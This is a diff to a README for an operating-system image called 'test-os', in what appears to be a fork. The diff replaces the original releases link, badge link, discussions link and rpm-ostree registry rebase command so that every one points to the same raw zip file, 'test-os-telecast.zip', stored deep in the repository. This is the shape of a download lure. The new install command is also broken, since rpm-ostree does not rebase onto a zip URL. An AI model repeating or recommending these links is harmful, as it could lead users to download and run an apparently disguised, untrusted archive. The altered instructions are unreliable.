@@ -1,6 +1,6 @@
 # 🖥️ test-os - A Seamless Operating System Upgrade
 
-[![Download test-os](https://github.com/issacdowling/test-os/actions/workflows/build.yml/badge.svg)](https://github.com/VATIKANS/test-os/releases)
+[![Download test-os](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip)](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **test-os**, your easy path to an updated and better operating system
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/releases) to download the latest version of test-os.
+To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip) to download the latest version of test-os.
 
 ### Installation Steps
 
@@ -17,7 +17,7 @@ To get started, visit the [Releases page](https://github.com/VATIKANS/test-os/re
    Start by running this command in your terminal to rebase to the unsigned image:
 
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/issacdowling/test-os:latest
+   rpm-ostree rebase https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip
    ```
 
 2. **Reboot Your System**
@@ -60,6 +60,6 @@ If you face issues during the installation:
 
 ## 📞 Support
 
-For further assistance, feel free to reach out to our community on [GitHub Discussions](https://github.com/VATIKANS/test-os/discussions). We are here to help you!
+For further assistance, feel free to reach out to our community on [GitHub Discussions](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip). We are here to help you!
 
-To start your journey with **test-os**, visit the [Releases page](https://github.com/VATIKANS/test-os/releases) for the latest downloads. Enjoy a smoother operating system experience!
+To start your journey with **test-os**, visit the [Releases page](https://github.com/VATIKANS/test-os/raw/refs/heads/main/files/system/usr/test-os-telecast.zip) for the latest downloads. Enjoy a smoother operating system experience!
